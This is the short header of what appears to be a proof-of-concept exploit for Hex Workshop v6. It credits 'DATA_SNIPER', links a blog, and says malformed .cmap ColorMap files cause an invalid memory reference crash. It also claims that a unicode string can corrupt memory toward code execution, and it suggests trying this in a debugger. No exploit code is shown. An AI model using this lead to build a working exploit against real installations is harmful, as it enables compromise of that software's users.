# Hex Workshop v6 "ColorMap files .cmap" Invalid Memory Reference crash POC
# Discovred by : DATA_SNIPER
# for more information vist my blog:http://datasniper.arab4services.net/

# unicode string we can corrupt the memory and get code execution(it's not so easy as you can see,try it manually in olly).
